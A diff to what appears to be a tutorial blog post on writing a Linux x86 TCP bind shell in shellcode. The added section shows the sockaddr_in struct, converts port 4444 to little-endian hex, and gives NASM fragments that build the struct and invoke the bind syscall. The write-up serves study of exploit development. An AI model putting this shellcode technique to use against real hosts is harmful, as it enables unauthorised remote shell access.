@@ -25,7 +25,7 @@ A TCP bind shellcode will bind a shell to a specific network port on a host list
 
 ![Bind Shell](/assets/images/bind_shell.png)
 
-Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT preventing unsolicited incoming connections (except for certain ports with known services). This limits the target host's exposure and will prevent a port-binding shellcode from receiving a successful connection.
+Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT preventing unsolicited incoming connections (except for certain ports/well known services). This limits the target host's exposure and will prevent a port-binding shellcode from receiving a successful connection.
 
 #### TCP BIND SHELL IN C
 --------
@@ -246,7 +246,7 @@ DESCRIPTION
        socket".
 ```
 
-The 3 arguments required can be summarised as:
+The 3 arguments required:
 
 * int sockfd - a reference to the newly created socket (EAX was moved into EDI)
 * const struct sockaddr *addr – a pointer to the location on the stack of the sockaddr struct to be created
@@ -256,6 +256,48 @@ The sockfd argument can be set by moving the value of EDI into EBX, this was ori
 
 ```nasm
 	mov ebx, edi    ; move the value of edi into ebx
+```
+
+The structure for handling internet addresses can be viewed via man pages for the header file:
+
+```bash
+cat /usr/include/netinet/in.h
+
+/* Structure describing an Internet (IP) socket address. */
+#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
+struct sockaddr_in {
+  __kernel_sa_family_t	sin_family;	/* Address family		*/
+  __be16		sin_port;	/* Port number			*/
+  struct in_addr	sin_addr;	/* Internet address		*/
+```
+
+4 structures can be defined:
+
+* AF_INET (Address family)
+* Port Number
+* Internet address
+* 0 (choose an unused port at random)
+
+Since the stack grows from High to Low memory it is important to remember to place these arguments onto the stack in reverse order.
+
+The chosen port number will need to be converted from decimal (4444) to hex (115C), which equates to 0x5c11 in Little Endian format.
+
+The Internet address will equal 0.0.0.0 (opens bind port to all interfaces).
+
+```nasm
+    xor ecx, ecx
+    push ecx
+    push ecx
+    push word 0x5c11
+    push word 0x02
+```    
+    
+Boom! Struct completed. Let’s put the pointer to this entity into the ECX register so that we can satisfy our const struct sockaddr *addr argument. We’ll also put 16 into the low part of the EDX register and call the interrupt again while we’re here since that’s easy enough.
+
+```nasm
+    mov ecx, esp
+    mov dl, 16
+    int 0x80
 ```
 
 #### Assembly Code
